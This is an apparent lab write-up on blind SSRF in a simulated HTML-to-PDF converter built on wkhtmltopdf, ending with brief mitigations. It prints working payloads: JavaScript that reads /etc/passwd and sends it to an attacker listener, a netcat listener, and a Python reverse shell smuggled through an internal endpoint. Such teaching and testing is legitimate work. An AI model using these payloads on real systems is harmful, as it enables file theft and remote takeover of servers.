---
title: "Exploring Blind SSRF Vulnerabilities in HTML to PDF Conversion Applications"
date: 2023-04-23 19:08:00
categories: [ssrf-vulnerabilies]
tags: [ssrf]
---

## Overview

This post delves into a case study of a blind Server-Side Request Forgery (SSRF) vulnerability within a fictitious application designed for converting HTML documents to PDFs. The application, which is a simulated target in a controlled environment, highlights the subtlety and potential impact of SSRF vulnerabilities, especially when they do not provide direct feedback or error messages.

## Testing Environment and Setup

The target application listens on port 8080 and accepts HTML files for processing into PDF documents. Initial observations indicated that the server's response was identical regardless of the HTML content provided, suggesting no visible data processing errors or SSRF indications through the front-end.

## Conducting Blind SSRF Tests

To test for blind SSRF, we employed an external server setup to capture any outbound requests from the application. The test involved submitting an HTML file containing a reference to an image hosted on our external server:

    <!DOCTYPE html>
    <html>
    <body>
        <a>Hello World!</a>
        <img src="http://<SERVICE IP>:PORT/x?=viaimgtag">
    </body>
    </html>


## Simplifying SSRF Blind Testing with Netcat

For our testing purposes, we employ a simple Netcat listener running on a virtual machine (VM), set to listen on port 9090. This setup allows us to capture any incoming requests and observe the web application's external interactions, which are pivotal in identifying and exploiting SSRF vulnerabilities.

### Setting Up the Netcat Listener

Here's the command to set up the Netcat listener, crucial for our SSRF testing:

  
    sudo nc -nlvp 9090
   

This command configures Netcat to listen on all interfaces at port 9090, ready to log any incoming requests.

### Observations After Submitting the HTML File

Upon submitting an HTML file containing external resource references, the application attempts to fetch these resources. This behavior confirms the existence of an SSRF vulnerability as it shows the application making unauthorized external network calls based on HTML content.

## JavaScript Exploitation and Data Exfiltration

Further exploration reveals that the application's PDF conversion tool, wkhtmltopdf, supports JavaScript execution within HTML files. We exploit this feature to perform data exfiltration as demonstrated below:

    
    <html>
    <body>
        <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "file:///etc/passwd", true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                // Encode the file contents in base64
                var b64content = btoa(xhr.responseText);
                // Send the encoded data to our external server
                var exfil = new XMLHttpRequest();
                exfil.open("GET", "http://<EXTERNAL SERVICE IP>:9090/exfil?data=" + b64content, true);
                exfil.send();
            }
        };
        xhr.send();
        </script>
    </body>
    </html>


This script reads the local `/etc/passwd` file and sends its Base64-encoded contents to our Netcat listener, showcasing a direct method of exploiting the SSRF vulnerability to extract sensitive information.


# Blind SSRF Exploitation with Netcat and Base64 Decoding

In this scenario, we use two XMLHttpRequest objects: one for reading local files and another to send this data to our server, encoded in Base64.

## Starting an HTTP Server and Sending Data

We start an HTTP server and send an HTML file that waits for a response and decodes the content after processing.

### Netcat Listener


    sudo nc -nlvp 9090
    Listening on 0.0.0.0 9090


### Base64 Decoding

We decode the information using Base64 to view the data received, which includes commands and system user information.

echo "<BASE64_DATA>" | base64 -d


## Blind SSRF Exploitation Scenario

We continue to exploit an internal application vulnerable to SSRF to execute remote commands on the target server. In this scenario, we use an HTML document with a specific payload to exploit the application.

### Bash Reverse Shell

We set up and encode a reverse shell payload to gain remote control of the server.

    export RHOST="<VPN/TUN IP>"; export RPORT="<PORT>"; python -c 'import sys, socket, os, pty; s=socket.socket(); s.connect((os.getenv("RHOST"), int(os.getenv("RPORT")))); [os.dup2(s.fileno(), fd) for fd in (0,1,2)]; pty.spawn("/bin/sh")'


### Encoded URL Payload

    export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527


### HTML Payload

    <html>
        <body>
            <b>Reverse Shell via Blind SSRF</b>
            <script>
            var http = new XMLHttpRequest();
            http.open("GET","http://host_ip/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
            http.send();
            http.onerror = function(){document.write('<a>Oops!</a>');}
            </script>
        </body>
    </html>


Once we initiate a Netcat listener on our machine and send the above HTML file, we will receive a reverse shell from host.


## Mitigation Strategies

To mitigate blind SSRF vulnerabilities effectively, it is crucial to:

- **Validate and sanitize all incoming data**, especially URLs and file paths, to prevent external resource references.
- **Implement strict allowlists** for outbound connections and protocols that the server is permitted to access.
- **Use secure programming practices** to disable unnecessary HTTP features that could be exploited via SSRF.
- **Regularly update and patch** third-party libraries and tools used for processing user-supplied content.

## Conclusion

Blind SSRF poses significant security risks, especially in applications that process external inputs to interact with internal or external resources. Understanding and implementing robust mitigation strategies are vital for securing web applications against these potential attacks and data breaches.